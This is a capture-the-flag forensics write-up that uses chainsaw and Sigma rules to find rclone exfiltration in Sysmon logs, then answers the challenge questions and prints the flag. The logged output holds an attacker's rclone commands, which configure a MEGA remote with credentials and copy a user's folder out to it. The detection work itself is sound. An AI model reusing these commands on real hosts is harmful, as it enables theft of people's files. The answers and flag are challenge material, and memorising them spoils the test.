# Packet Cyclone
> Write-up author: jon-brandy
## DESCRIPTION:
Pandora's friend and partner, Wade, is the one that leads the investigation into the relic's location. Recently, he noticed some weird traffic coming from his host. That led him to believe that his host was compromised. After a quick investigation, his fear was confirmed. Pandora tries now to see if the attacker caused the suspicious traffic during the exfiltration phase. Pandora believes that the malicious actor used rclone to exfiltrate Wade's research to the cloud. Using the tool called "chainsaw" and the sigma rules provided, can you detect the usage of rclone from the event logs produced by Sysmon? To get the flag, you need to start and connect to the docker service and answer all the questions correctly.

## HINT:
- NONE

## STEPS:
1. Unzipping the zip file shall resulting into 2 directories namely `Logs` & `sigma_rules`.

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/edc07ea3-d96f-44a4-ba67-256f63caa240)


2. Well.. This challenge is very straight forward, based from the description we know that we need to use `chainsaw` which we can download from this:

```
https://github.com/WithSecureLabs/chainsaw
```

3. I tried to use this on linux but it won't work properly for me, so i used it on windows.

> COMMAND

```console
.\chainsaw\chainsaw.exe hunt .\Logs\ -s .\sigma_rules\ --mapping .\chainsaw\mappings\sigma-event-logs-all.yml -o chainsaw-result.txt
```

> RESULT

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/1e40ee04-0e0a-42dd-8769-d7359a93c325)


```txt

[+] Group: Sigma
┌─────────────────────┬────────────────────────────┬───────┬───────────────────────┬──────────┬───────────┬─────────────────┬──────────────────────┐
│      timestamp      │         detections         │ count │ Event.System.Provider │ Event ID │ Record ID │    Computer     │      Event Data      │
├─────────────────────┼────────────────────────────┼───────┼───────────────────────┼──────────┼───────────┼─────────────────┼──────────────────────┤
│ 2023-02-24 15:35:07 │ + Rclone Execution via     │ 1     │ Microsoft-Windows-Sy  │ 1        │ 76        │ DESKTOP-UTDHED2 │ CommandLine: '"C:\Us │
│                     │ Command Line or PowerShell │       │ smon                  │          │           │                 │ ers\wade\AppData\Loc │
│                     │                            │       │                       │          │           │                 │ al\Temp\rclone-v1.61 │
│                     │                            │       │                       │          │           │                 │ .1-windows-amd64\rcl │
│                     │                            │       │                       │          │           │                 │ one.exe" config crea │
│                     │                            │       │                       │          │           │                 │ te remote mega user  │
│                     │                            │       │                       │          │           │                 │ majmeret@protonmail. │
│                     │                            │       │                       │          │           │                 │ com pass FBMeavdiaFZ │
│                     │                            │       │                       │          │           │                 │ bWzpMqIVhJCGXZ5XXZI1 │
│                     │                            │       │                       │          │           │                 │ qsU3EjhoKQw0rEoQqHyI │
│                     │                            │       │                       │          │           │                 │ '                    │
│                     │                            │       │                       │          │           │                 │ Company: https://rcl │
│                     │                            │       │                       │          │           │                 │ one.org              │
│                     │                            │       │                       │          │           │                 │ CurrentDirectory: C: │
│                     │                            │       │                       │          │           │                 │ \Users\wade\AppData\ │
│                     │                            │       │                       │          │           │                 │ Local\Temp\rclone-v1 │
│                     │                            │       │                       │          │           │                 │ .61.1-windows-amd64\ │
│                     │                            │       │                       │          │           │                 │ Description: Rsync f │
│                     │                            │       │                       │          │           │                 │ or cloud storage     │
│                     │                            │       │                       │          │           │                 │ FileVersion: 1.61.1  │
│                     │                            │       │                       │          │           │                 │ Hashes: SHA256=E9490 │
│                     │                            │       │                       │          │           │                 │ 1809FF7CC5168C1E857D │
│                     │                            │       │                       │          │           │                 │ 4AC9CBB339CA1F6E21DC │
│                     │                            │       │                       │          │           │                 │ CE95DFB8E28DF799961  │
│                     │                            │       │                       │          │           │                 │ Image: C:\Users\wade │
│                     │                            │       │                       │          │           │                 │ \AppData\Local\Temp\ │
│                     │                            │       │                       │          │           │                 │ rclone-v1.61.1-windo │
│                     │                            │       │                       │          │           │                 │ ws-amd64\rclone.exe  │
│                     │                            │       │                       │          │           │                 │ IntegrityLevel: Medi │
│                     │                            │       │                       │          │           │                 │ um                   │
│                     │                            │       │                       │          │           │                 │ LogonGuid: 10DA3E43- │
│                     │                            │       │                       │          │           │                 │ D892-63F8-4B6D-03000 │
│                     │                            │       │                       │          │           │                 │ 0000000              │
│                     │                            │       │                       │          │           │                 │ LogonId: '0x36d4b'   │
│                     │                            │       │                       │          │           │                 │ OriginalFileName: rc │
│                     │                            │       │                       │          │           │                 │ lone.exe             │
│                     │                            │       │                       │          │           │                 │ ParentCommandLine: ' │
│                     │                            │       │                       │          │           │                 │ "C:\Windows\System32 │
│                     │                            │       │                       │          │           │                 │ \WindowsPowerShell\v │
│                     │                            │       │                       │          │           │                 │ 1.0\powershell.exe"  │
│                     │                            │       │                       │          │           │                 │ '                    │
│                     │                            │       │                       │          │           │                 │ ParentImage: C:\Wind │
│                     │                            │       │                       │          │           │                 │ ows\System32\Windows │
│                     │                            │       │                       │          │           │                 │ PowerShell\v1.0\powe │
│                     │                            │       │                       │          │           │                 │ rshell.exe           │
│                     │                            │       │                       │          │           │                 │ ParentProcessGuid: 1 │
│                     │                            │       │                       │          │           │                 │ 0DA3E43-D8D2-63F8-9B │
│                     │                            │       │                       │          │           │                 │ 00-000000000900      │
│                     │                            │       │                       │          │           │                 │ ParentProcessId: 588 │
│                     │                            │       │                       │          │           │                 │ 8                    │
│                     │                            │       │                       │          │           │                 │ ParentUser: DESKTOP- │
│                     │                            │       │                       │          │           │                 │ UTDHED2\wade         │
│                     │                            │       │                       │          │           │                 │ ProcessGuid: 10DA3E4 │
│                     │                            │       │                       │          │           │                 │ 3-D92B-63F8-B100-000 │
│                     │                            │       │                       │          │           │                 │ 000000900            │
│                     │                            │       │                       │          │           │                 │ ProcessId: 3820      │
│                     │                            │       │                       │          │           │                 │ Product: Rclone      │
│                     │                            │       │                       │          │           │                 │ RuleName: '-'        │
│                     │                            │       │                       │          │           │                 │ TerminalSessionId: 1 │
│                     │                            │       │                       │          │           │                 │ User: DESKTOP-UTDHED │
│                     │                            │       │                       │          │           │                 │ 2\wade               │
│                     │                            │       │                       │          │           │                 │ UtcTime: 2023-02-24  │
│                     │                            │       │                       │          │           │                 │ 15:35:07.336         │
├─────────────────────┼────────────────────────────┼───────┼───────────────────────┼──────────┼───────────┼─────────────────┼──────────────────────┤
│ 2023-02-24 15:35:17 │ + Rclone Execution via     │ 1     │ Microsoft-Windows-Sy  │ 1        │ 78        │ DESKTOP-UTDHED2 │ CommandLine: '"C:\Us │
│                     │ Command Line or PowerShell │       │ smon                  │          │           │                 │ ers\wade\AppData\Loc │
│                     │                            │       │                       │          │           │                 │ al\Temp\rclone-v1.61 │
│                     │                            │       │                       │          │           │                 │ .1-windows-amd64\rcl │
│                     │                            │       │                       │          │           │                 │ one.exe" copy C:\Use │
│                     │                            │       │                       │          │           │                 │ rs\Wade\Desktop\Reli │
│                     │                            │       │                       │          │           │                 │ c_location\ remote:e │
│                     │                            │       │                       │          │           │                 │ xfiltration -v'      │
│                     │                            │       │                       │          │           │                 │ Company: https://rcl │
│                     │                            │       │                       │          │           │                 │ one.org              │
│                     │                            │       │                       │          │           │                 │ CurrentDirectory: C: │
│                     │                            │       │                       │          │           │                 │ \Users\wade\AppData\ │
│                     │                            │       │                       │          │           │                 │ Local\Temp\rclone-v1 │
│                     │                            │       │                       │          │           │                 │ .61.1-windows-amd64\ │
│                     │                            │       │                       │          │           │                 │ Description: Rsync f │
│                     │                            │       │                       │          │           │                 │ or cloud storage     │
│                     │                            │       │                       │          │           │                 │ FileVersion: 1.61.1  │
│                     │                            │       │                       │          │           │                 │ Hashes: SHA256=E9490 │
│                     │                            │       │                       │          │           │                 │ 1809FF7CC5168C1E857D │
│                     │                            │       │                       │          │           │                 │ 4AC9CBB339CA1F6E21DC │
│                     │                            │       │                       │          │           │                 │ CE95DFB8E28DF799961  │
│                     │                            │       │                       │          │           │                 │ Image: C:\Users\wade │
│                     │                            │       │                       │          │           │                 │ \AppData\Local\Temp\ │
│                     │                            │       │                       │          │           │                 │ rclone-v1.61.1-windo │
│                     │                            │       │                       │          │           │                 │ ws-amd64\rclone.exe  │
│                     │                            │       │                       │          │           │                 │ IntegrityLevel: Medi │
│                     │                            │       │                       │          │           │                 │ um                   │
│                     │                            │       │                       │          │           │                 │ LogonGuid: 10DA3E43- │
│                     │                            │       │                       │          │           │                 │ D892-63F8-4B6D-03000 │
│                     │                            │       │                       │          │           │                 │ 0000000              │
│                     │                            │       │                       │          │           │                 │ LogonId: '0x36d4b'   │
│                     │                            │       │                       │          │           │                 │ OriginalFileName: rc │
│                     │                            │       │                       │          │           │                 │ lone.exe             │
│                     │                            │       │                       │          │           │                 │ ParentCommandLine: ' │
│                     │                            │       │                       │          │           │                 │ "C:\Windows\System32 │
│                     │                            │       │                       │          │           │                 │ \WindowsPowerShell\v │
│                     │                            │       │                       │          │           │                 │ 1.0\powershell.exe"  │
│                     │                            │       │                       │          │           │                 │ '                    │
│                     │                            │       │                       │          │           │                 │ ParentImage: C:\Wind │
│                     │                            │       │                       │          │           │                 │ ows\System32\Windows │
│                     │                            │       │                       │          │           │                 │ PowerShell\v1.0\powe │
│                     │                            │       │                       │          │           │                 │ rshell.exe           │
│                     │                            │       │                       │          │           │                 │ ParentProcessGuid: 1 │
│                     │                            │       │                       │          │           │                 │ 0DA3E43-D8D2-63F8-9B │
│                     │                            │       │                       │          │           │                 │ 00-000000000900      │
│                     │                            │       │                       │          │           │                 │ ParentProcessId: 588 │
│                     │                            │       │                       │          │           │                 │ 8                    │
│                     │                            │       │                       │          │           │                 │ ParentUser: DESKTOP- │
│                     │                            │       │                       │          │           │                 │ UTDHED2\wade         │
│                     │                            │       │                       │          │           │                 │ ProcessGuid: 10DA3E4 │
│                     │                            │       │                       │          │           │                 │ 3-D935-63F8-B200-000 │
│                     │                            │       │                       │          │           │                 │ 000000900            │
│                     │                            │       │                       │          │           │                 │ ProcessId: 5116      │
│                     │                            │       │                       │          │           │                 │ Product: Rclone      │
│                     │                            │       │                       │          │           │                 │ RuleName: '-'        │
│                     │                            │       │                       │          │           │                 │ TerminalSessionId: 1 │
│                     │                            │       │                       │          │           │                 │ User: DESKTOP-UTDHED │
│                     │                            │       │                       │          │           │                 │ 2\wade               │
│                     │                            │       │                       │          │           │                 │ UtcTime: 2023-02-24  │
│                     │                            │       │                       │          │           │                 │ 15:35:17.516         │
└─────────────────────┴────────────────────────────┴───────┴───────────────────────┴──────────┴───────────┴─────────────────┴──────────────────────┘
```

4. Let's run nc to the host.

> QUESTION 1

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/9f163995-d493-49f9-be66-01cac43c07e0)


5. Based from the result we have, the answer must be `majmeret@protonmail.com`.


> QUESTION 2

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/72d7caae-0a55-4f35-a78d-657cb635ce7a)


6. Ans --> `FBMeavdiaFZbWzpMqIVhJCGXZ5XXZI1qsU3EjhoKQw0rEoQqHyI`.

> QUESTION 3

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/28361e29-5554-4dd6-b9ea-51069cd46603)

7. Ans --> `mega`.

> QUESTION 4

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/95a1daaa-ca11-43a3-8f11-3ad5b8a540fd)

8. Ans --> `3820`.

> QUESTION 5

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/7fa84507-7d65-470f-ac38-35ae29fab700)

9. Ans --> `C:\Users\Wade\Desktop\Relic_location`.

> QUESTION 6

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/9eee02a8-e5c4-44dd-bd2e-807ef585a7c6)


10. Ans --> `exfiltration`.

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/81396e8e-d424-4a2f-a15f-66b5f7bbbe5f)


11. Got the flag!

## FLAG
```
HTB{Rcl0n3_1s_n0t_s0_inn0c3nt_4ft3r_4ll}
```
